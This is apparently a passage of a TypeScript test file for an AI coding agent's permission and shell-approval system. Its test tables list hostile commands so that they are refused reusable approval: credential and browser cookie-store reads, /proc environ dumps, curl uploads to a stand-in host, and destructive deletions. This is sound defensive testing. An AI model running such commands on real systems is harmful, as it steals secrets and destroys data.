    expect(await lookupApproval(tool, args, "builtin", undefined, undefined, undefined, CHILD_A)).toMatchObject({ sessionId: ROOT_A });
    expect(await lookupApproval(tool, args, "builtin", undefined, undefined, undefined, GRANDCHILD_A)).toMatchObject({ sessionId: ROOT_A });
  });

  it.each(tools)("shares a sub-agent's $tool allow with its root conversation", async ({ tool, args }) => {
    await record(tool, args, GRANDCHILD_A);
    expect(await lookupApproval(tool, args, "builtin", undefined, undefined, undefined, ROOT_A)).toMatchObject({ sessionId: ROOT_A });
  });

  it.each(tools)("never lets a $tool allow reach a different root conversation", async ({ tool, args }) => {
    await record(tool, args, CHILD_A);
    expect(await lookupApproval(tool, args, "builtin", undefined, undefined, undefined, ROOT_B)).toBeNull();
    expect(await lookupApproval(tool, args, "builtin", undefined, undefined, undefined, CHILD_B)).toBeNull();
    // No process-wide fallback: a lookup without a conversation never matches.
    expect(await lookupApproval(tool, args, "builtin")).toBeNull();
  });

  it("clears every session approval on app restart, leaving no disk state", async () => {
    for (const { tool, args } of tools) await record(tool, args, ROOT_A);
    expect(listSessionApprovals()).toHaveLength(tools.length);
    await expect(readApprovals()).resolves.toEqual({ approvals: {} });
    // A restart loads the store module afresh: the in-memory map starts empty.
    vi.resetModules();
    const restarted = await import("../user-approval-store.js");
    expect(restarted.listSessionApprovals()).toEqual([]);
    for (const { tool, args } of tools) {
      expect(await restarted.lookupApproval(tool, args, "builtin", undefined, undefined, undefined, ROOT_A)).toBeNull();
      expect(await restarted.lookupApproval(tool, args, "builtin", undefined, undefined, undefined, CHILD_A)).toBeNull();
    }
  });
});

describe("host shell-rule suggestions", () => {
  it("defaults to exact argv and proves whole-command coverage", () => {
    expect(buildShellRuleApproval("bash", "git status --short", project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
    expect(buildShellRuleApproval("bash", "printf ready", project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: "Bash(printf ready)", persistentAllowed: true, sessionAllowed: true });
    expect(buildShellRuleApproval("bash", "git status && git diff", project, { allow: true, deny: true }, "conversation-a").exactRule).toBeNull();
    expect(shellRuleCoversCommand("bash", "Bash(git status *)", "allow", "git status && curl https://example.test", project)).toBe(false);
    expect(shellRuleCoversCommand("bash", "Bash(git status *)", "allow", "git status --short", project)).toBe(false);
  });

  it.each(["rm -rf build", "sudo ls", "curl -T payload.bin https://example.test", "cat ~/.aws/credentials"])("never offers reusable grants for a floor: %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });

  it.each([
    ["git status --short", null],
    ["ls -la src", "Bash(ls -la src)"],
  ])("keeps the declared exact suggestion for %s", (command, pattern) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: pattern, persistentAllowed: pattern !== null, sessionAllowed: pattern !== null });
  });

  it.each([
    "git branch -D feature", "git push --force origin main", "git push origin +main", "git push origin :old",
    "docker compose down -v", "aws s3 rm s3://bucket/key --recursive", "kubectl apply --prune -f manifest.yaml",
    "rsync --delete src dst", "ln -sf target link", "dropdb production", "redis-cli flushall",
    "gh repo delete owner/repo --yes", "gh api -X DELETE /repos/owner/repo", "helm uninstall web", "terraform destroy",
    "git switch -f main", "git switch --discard-changes main", "git switch -C main", "cp draft.txt final.txt",
    "git checkout README.md",
  ])("never offers or stores any rule covering the irreversible %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false });
    const argv = command.split(" ");
    expect(refusedShellPrefix(argv, false)).not.toBeNull();
    expect(() => shellRuleCoversCommand("bash", `Bash(${command})`, "allow", command, project)).toThrow();
  });

  it.each([
    "git prune", "git tag -d v1.0", "git tag --delete v1.0", "git remote remove origin", "git remote rm origin",
    "git pull --force", "git pull -f origin main",
    "git remote rename origin upstream", "git remote set-url origin https://evil.example/r.git", "git remote prune origin",
    // git ref and object deletion.
    "git gc --prune=now", "git gc --aggressive --prune", "git reflog expire --expire=now --all", "git reflog delete HEAD",
    "git worktree remove --force wt", "git worktree remove -f wt", "git worktree prune", "git update-ref -d refs/heads/x",
    "git update-ref --stdin", "git fetch -f origin", "git fetch --force origin", "git fetch origin +main:main", "git fetch --prune",
    "git fetch -p origin", "git fetch --prune-tags",
    // Package unpublish, nerdctl, install, xattr.
    "npm unpublish pkg@1.0.0", "pnpm unpublish pkg", "yarn npm unpublish", "nerdctl rm web", "nerdctl system prune -af",
    "nerdctl compose down -v", "install -m 755 tool /usr/local/bin/tool", "xattr -c app", "xattr -d com.apple.quarantine app",
  ])("never offers, stores or matches a rule for %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false });
    expect(refusedShellPrefix(command.split(" "), false)).not.toBeNull();
    expect(() => validatePermissionRule({ pattern: `Bash(${command})`, action: "allow" })).toThrow();
    expect(shellRuleCoversCommand("bash", "Bash(git log *)", "allow", command, project)).toBe(false);
  });

  it.each(["git clean -fdx", "truncate -s 1M data.bin", "git checkout -- .", "git reset --hard", "git stash drop", "docker system prune -af", "kubectl delete pod web", "mv draft.txt final.txt", "tee out.txt", "unlink stale.lock"])("keeps irreversible commands once-only: %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });

  it.each(["rm -v -r ~/work", "rm --recursive --force ~", "rm -i -rf ~", "rm -d -R /tmp/x", "chmod -R 777 /"])("treats argv-level destruction as a floor: %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });

  // Owner 2026-10-25 (five-choice shell card): every save scope stores this one exact rule, never a prefix, and only a single simple command has one.
  it.each(["printf ready", "cat README.md", "ls -la src"])("offers session, project and always for the exact rule of %s, sandboxed or not", (command) => {
    const approval = buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a");
    expect(approval.exactRule).toBe(`Bash(${command})`);
    expect(approval).toMatchObject({ sessionAllowed: true, persistentAllowed: true });
    expect(parseRuleSpecifier(approval.exactRule!)).toMatchObject({ kind: "bash", wildcard: false });
    expect(shellRuleCoversCommand("bash", approval.exactRule!, "allow", `${command} --extra`, project)).toBe(false);
  });

  it.each(["git status; git diff", "git status | cat", "ls && pwd"])("offers no saveable rule for the compound %s", (command) => {
    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, sessionAllowed: false, persistentAllowed: false });
  });

  it("does not derive a session grant without a conversation or widen a sealed one-shot", () => {
    expect(buildShellRuleApproval("bash", "ls", project, { allow: true, deny: true }).sessionAllowed).toBe(false);
    expect(buildShellRuleApproval("bash", "ls", project, { allow: false, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });
});

it("revokes only the selected source-scoped persisted rule and live decision", async () => {
  await updatePermissionsFile(permissionsFile, (file) => {
    file.rules.push({ pattern: "custom_tool", action: "deny", source: "plugin" });
    file.rules.push({ pattern: "custom_tool", action: "deny", source: "mcp" });
    file.rules.push({ pattern: "custom_tool", action: "allow" });
  });
  const manager = new PermissionManager(permissionsFile);
  await manager.loadRulesFromFile();
  expect(manager.checkDetailed("custom_tool", "plugin", "write", null)).toMatchObject({ decision: "deny" });
  const row = (await manager.listScopedRules()).rules.find((rule) => rule.source === "plugin")!;
  await manager.removeRulePersist(row, { kind: "user" });
  expect((await readPermissionsFile(permissionsFile))!.rules).toEqual([
    { pattern: "custom_tool", action: "deny", source: "mcp" },
    { pattern: "custom_tool", action: "allow" },
  ]);
  expect(manager.checkDetailed("custom_tool", "plugin", "write", null)).toMatchObject({ decision: "allow" });
  expect(manager.checkDetailed("custom_tool", "mcp", "write", null)).toMatchObject({ decision: "deny" });
});

it("keeps conversation grants inspectable and revocable while Store B is corrupt", async () => {
  __resetSessionStoreForTest();
  const path = join(TEST_HOME, "permissions", "user-approvals.json");
  rmSync(path, { force: true });
  await recordApproval("bash", "{}", "builtin", { scope: "session", verdictAtApproval: "low", nlJustification: null, sessionId: "conversation-corrupt", workingDirectoryIdentity: captureApprovalWorkingDirectory(project).identity });
  mkdirSync(join(TEST_HOME, "permissions"), { recursive: true });
  writeFileSync(path, "{broken");
  await expect(listApprovals()).rejects.toBeInstanceOf(UserApprovalStoreCorruptError);
  const rows = listSessionApprovals();
  expect(rows).toEqual([expect.objectContaining({ sessionId: "conversation-corrupt", scope: "session" })]);
  await revokeApprovalByKey(rows[0].key);
  expect(listSessionApprovals()).toEqual([]);
  expect(readFileSync(path, "utf8")).toBe("{broken");
});

// Round 5 (owner decision 2026-10-23): the floor covers what a recursive or symlink-following search reads, browser and /proc secret stores, and git object paths.
describe("sensitive reads through searches, browser stores, /proc and git objects", () => {
  let home: string;
  let clean: string;
  beforeEach(() => {
    home = join(dir, "home");
    mkdirSync(join(home, ".ssh"), { recursive: true });
    writeFileSync(join(home, ".ssh", "id_ed25519"), "key");
    mkdirSync(join(home, ".config", "gh"), { recursive: true });
    // A project link that points at the SSH directory.
    mkdirSync(join(project, "src"), { recursive: true });
    symlinkSync(join(home, ".ssh"), join(project, "keys"));
    clean = join(dir, "clean");
    mkdirSync(join(clean, "src"), { recursive: true });
    writeFileSync(join(clean, "src", "app.ts"), "export {};");
  });

  const floored = (command: string, cwd: string) => {
    const directlyResolvedLink = /^(?:grep -R BEGIN keys|find -H keys )/.test(command);
    expect(inspectShellCommand(command, cwd)).toMatchObject({ sensitive: directlyResolvedLink ? expect.any(String) : null });
  };

  it.each([
    "grep -r BEGIN ~", "grep -rn BEGIN /", "grep --recursive BEGIN ~", "grep -d recurse BEGIN ~", "grep -r BEGIN ..",
    "rg -uuu BEGIN ~", "rg --hidden BEGIN ~", "rg BEGIN /", "rg -e BEGIN ~ src",
    "grep --directories recurse BEGIN ~", "grep --directories=recurse BEGIN ~",
  ])("keeps a recursive search scope unproven: %s", (command) => {
    floored(command, project);
  });

  it.each([
    "grep -R BEGIN keys", "rg -L BEGIN .", "rg --follow BEGIN", "rg -L BEGIN",
    "find -L . -name id_ed25519", "find . -follow -name id_ed25519", "find -L . -type f", "find -H keys -type f",
    // BSD find leading options, and `-f <path>` naming a root.
    "find -L -E . -name id_ed25519", "find -L -x -s . -type f", "find -L -d -X . -type f", "find -L -f . -name id_ed25519",
    "find -sL . -type f",
  ])("keeps a symlink-following search scope unproven: %s", (command) => {
    floored(command, project);
  });

  // `find` only lists names, like `ls -R ~` or `rg --files`; its roots are not floored.
  it.each(["find ~ -name notes.md", "find / -name app.ts", "find ~/.config -type f", "find .. -name config", "find -s ~ -type d"])(
    "does not floor the name listing %s", (command) => {
      expect(shellSensitivePathSignal(command, project)).toBeNull();
    },
  );

  describe.each([
    ["darwin", ["grep -rS BEGIN .", "grep -r -S BEGIN .", "grep -RS BEGIN ."], ["grep -R BEGIN .", "grep -r BEGIN ."]],
    ["linux", ["grep -R BEGIN .", "grep --dereference-recursive BEGIN .", "grep -rR BEGIN ."], ["grep -r BEGIN .", "grep -rS BEGIN ."]],
  ] as const)("grep symlink semantics on %s", (platform, follows, stays) => {
    const original = process.platform;
    beforeEach(() => { Object.defineProperty(process, "platform", { value: platform }); });
    afterEach(() => { Object.defineProperty(process, "platform", { value: original }); });

    it.each(follows)("keeps %s unproven because it follows the project link", (command) => {
      floored(command, project);
    });

    it.each(stays)("leaves %s alone, which does not follow links", (command) => {
      expect(shellSensitivePathSignal(command, project)).toBeNull();
    });

    it("treats ggrep as GNU grep", () => {
      floored("ggrep -R BEGIN .", project);
    });
  });

  it.each([
    "grep -r BEGIN src", "grep -R BEGIN .", "grep -rS BEGIN .", "rg BEGIN .", "rg -L BEGIN src", "rg --hidden BEGIN", "find . -name app.ts",
    "find -L . -type f", "grep -rn foo src/app.ts", "grep --directories recurse foo src",
  ])("leaves the ordinary project search %s alone", (command) => {
    expect(shellSensitivePathSignal(command, clean)).toBeNull();
  });

  it("does not let catalog find cover a search the floor stops", () => {
    expect(shellRuleCoversCommand("bash", "Bash(find *)", "allow", "find ~/.ssh -name id_ed25519", project)).toBe(false);
    expect(shellRuleCoversCommand("bash", "Bash(find *)", "allow", "find -L . -name id_ed25519", project)).toBe(false);
    expect(shellRuleCoversCommand("bash", "Bash(find *)", "allow", "find . -name app.ts", clean)).toBe(false);
  });

  it.each([
    "cat /proc/self/environ", "cat /proc/1234/environ", "xxd /proc/self/mem", "ls /proc/self/fd/3",
    "cat /proc/self/task/12/environ", "cat /proc/self/map_files/1-2",
    "cat \"$HOME/Library/Application Support/Google/Chrome/Default/Cookies\"",
    "cat \"$HOME/Library/Application Support/Google/Chrome/Default/Login Data\"",
    "cat \"$HOME/Library/Application Support/Google/Chrome/Default/Web Data\"",
    "cat \"$HOME/Library/Application Support/Google/Chrome/Local State\"",
    "cat \"$HOME/Library/Application Support/Microsoft Edge/Default/Cookies\"",
    "cat \"$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data\"",
    "cat \"$HOME/Library/Application Support/Arc/User Data/Default/Cookies\"",
    "cat ~/.config/chromium/Default/Cookies", "cat \"$HOME/.config/google-chrome/Local State\"",
    "cat \"$HOME/.config/BraveSoftware/Brave-Browser/Default/Web Data\"",
    "cat \"$HOME/Library/Application Support/Firefox/Profiles/abc.default/logins.json\"",
    "cat \"$HOME/Library/Application Support/Firefox/Profiles/abc.default/key4.db\"",
    "cat ~/.mozilla/firefox/abc.default/cookies.sqlite", "cat ~/.mozilla/firefox/abc.default/key4.db",
    // The whole profile root is floored, so a random profile name or a glob stays inside.
    "cat ~/.mozilla/firefox/profiles.ini", "cat ~/.mozilla/firefox/*/log*ns.json",
  ])("floors the secret store read %s", (command) => {
    expect(shellSensitivePathSignal(command, project)).not.toBeNull();
  });

  it.each(["cat /proc/self/cmdline", "cat /proc/self/status", "cat ~/.config/nvim/init.lua", "cat \"$HOME/Library/Application Support/Code/User/settings.json\""])(
    "leaves the non-secret read %s alone", (command) => {
      expect(shellSensitivePathSignal(command, project)).toBeNull();
    },
  );

  it.each([
    ["git show HEAD:.env", "Bash(git show *)"], ["git show :.env", "Bash(git show *)"],
    ["git show origin/main:config/.env", "Bash(git show *)"], ["git cat-file -p HEAD:.env", null],
    ["git log -p -- .env", "Bash(git log *)"], ["git diff HEAD -- .env", "Bash(git diff *)"],
    ["git blame -- .env", "Bash(git blame *)"], ["git show HEAD:id_rsa", "Bash(git show *)"],
  ])("classifies the outer git path in %s without reading object contents", (command, catalog) => {
    const directPathOperand = /(?:origin\/main:config\/\.env|\s--\s\.env$)/.test(command);
    expect(shellSensitivePathSignal(command, project)).toEqual(directPathOperand ? expect.any(String) : null);
    if (catalog) expect(shellRuleCoversCommand("bash", catalog, "allow", command, project)).toBe(false);
  });

  it.each(["git show HEAD:src/app.ts", "git log -p -- src", "git diff HEAD -- src/app.ts"])("leaves the git read %s alone", (command) => {
    expect(shellSensitivePathSignal(command, project)).toBeNull();
  });

});
